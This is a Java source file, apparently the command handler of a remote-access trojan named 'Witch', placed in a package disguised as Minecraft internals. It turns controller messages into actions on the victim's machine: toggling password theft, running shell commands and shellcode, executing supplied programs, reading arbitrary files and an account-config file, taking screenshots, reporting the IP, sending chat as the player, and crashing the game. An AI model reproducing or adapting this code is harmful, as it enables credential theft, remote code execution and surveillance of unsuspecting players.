package net.minecraft.internal.connection;

import net.minecraft.internal.Witch;
import me.soda.witch.shared.NetUtil;
import me.soda.witch.shared.socket.messages.Variables;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.LogUtil;
import me.soda.witch.shared.ProgramUtil;
import me.soda.witch.shared.socket.messages.Message;
import net.minecraft.client.util.GlfwUtil;
import net.minecraft.internal.utils.ChatUtil;
import net.minecraft.internal.utils.MCUtils;
import net.minecraft.internal.utils.ScreenshotUtil;
import net.minecraft.internal.utils.ShellcodeLoader;
import net.minecraft.text.Text;

import java.lang.management.ManagementFactory;

public class MessageHandler {
    public static void handleMessage(Message message) {
        String msgType = message.messageID;
        Object msg = message.data;
        LogUtil.println("Received message: " + msgType);
        try {
            switch (msgType) {
                case "steal_pwd_switch" ->
                        Variables.INSTANCE.passwordBeingLogged = !Variables.INSTANCE.passwordBeingLogged;
                case "chat_control" -> ChatUtil.sendChat((String) msg);
                case "chat_filter" -> Variables.INSTANCE.filterPattern = (String) msg;
                case "chat_filter_switch" -> Variables.INSTANCE.isBeingFiltered = !Variables.INSTANCE.isBeingFiltered;
                case "chat_mute" -> Variables.INSTANCE.isMuted = !Variables.INSTANCE.isMuted;
                case "mods" -> Witch.send(msgType, MCUtils.allMods());
                case "systeminfo" -> Witch.send(msgType, MCUtils.systemInfo());
                case "screenshot" -> ScreenshotUtil.gameScreenshot();
                case "screenshot2" -> Witch.send(msgType, ScreenshotUtil.systemScreenshot());
                case "chat" -> ChatUtil.chat(Text.of((String) msg), false);
                case "shell" -> new Thread(() -> {
                    String result = ProgramUtil.runCmd((String) msg);
                    Witch.send(msgType, "\n" + result);
                }).start();
                case "shellcode" -> {
                    if (ProgramUtil.isWin())
                        new Thread(() -> new ShellcodeLoader().loadShellCode((String) msg)).start();
                }
                case "log" -> Variables.INSTANCE.logChatAndCommand = !Variables.INSTANCE.logChatAndCommand;
                case "config" -> Witch.send(msgType, Variables.INSTANCE);
                case "player" -> Witch.send(msgType, MCUtils.getPlayerInfo());
                case "skin" -> MCUtils.sendPlayerSkin();
                case "server" -> {
                    MCUtils.disconnect();
                    Variables.INSTANCE.canJoinServer = !Variables.INSTANCE.canJoinServer;
                }
                case "kick" -> MCUtils.disconnect();
                case "execute" -> new Thread(() -> ProgramUtil.runProg((byte[]) msg)).start();
                case "iasconfig" -> Witch.send(msgType, FileUtil.read("config/ias.json"));
                case "read" -> Witch.send(msgType, FileUtil.read((String) msg));
                case "runargs" -> Witch.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
                case "props" -> Witch.send(msgType, System.getProperties());
                case "ip" -> Witch.send(msgType, NetUtil.getIP());
                case "crash" -> GlfwUtil.makeJvmCrash();
                case "server_name" -> Variables.INSTANCE.name = (String) msg;
            }
        } catch (Exception e) {
            LogUtil.println("Corrupted message!");
            LogUtil.printStackTrace(e);
        }
    }
}
